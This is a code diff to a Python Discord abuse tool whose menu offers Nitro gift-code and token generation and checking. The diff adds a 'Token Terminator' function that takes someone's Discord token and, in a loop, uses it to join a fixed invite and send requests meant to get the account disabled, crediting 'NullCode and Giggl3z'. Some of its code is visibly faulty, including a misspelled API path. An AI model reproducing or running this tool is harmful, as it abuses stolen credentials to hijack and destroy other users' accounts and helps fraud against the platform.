@@ -1,4 +1,4 @@
-import os, random, string, time, ctypes, sys, requests, base64
+import os, random, string, time, ctypes, sys, requests, base64, json
 from colorama import Fore
 from itertools import cycle
 from random import randint
@@ -36,13 +36,16 @@ def main():
 
     {Fore.BLUE}                                                   [1] Nitro Gen and Checker
                                                        [2] Token Gen and Checker
-                                                       [3] Exit{Fore.RESET}
+                                                       [3] Token Terminator
+                                                       [4] Exit{Fore.RESET}
 >''')
     if str(operation) == "1":
         generateCheck()
     elif str(operation) == "2":
         tokengen()
     elif str(operation) == "3":
+        terminate()
+    elif str(operation) == "4":
         exit()
     else:
         os.system('cls' if os.name == 'nt' else 'clear')
@@ -85,6 +88,22 @@ def get_proxies():
             proxies.add(proxy)
     return proxies
 
+def terminate(): 
+    token = input("Enter the token you want to terminate: ")
+    while True:
+        print("Terminating token...")
+        api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
+        data = api.json()
+        check = requests.get("https://discordapp.com/api/v6/guilds/" + data['guild']['id'], headers={"Authorization": token})
+        stuff = check.json()
+        requests.post("https://discordapp.com/api/v6/invite/hwcVZQw", headers={"Authorization": token})
+        requests.delete("https://discordapp.com/api/v6/guiilds" + data['guild']['id'], headers={"Authorization": token})
+
+        if stuff['code'] == 0:
+            print("Successfully disabled!")
+            print("Disabler by NullCode and Giggl3z")
+            time.sleep(2); break
+            
 def tokengen():
 
  N = input("How many you want?: ")
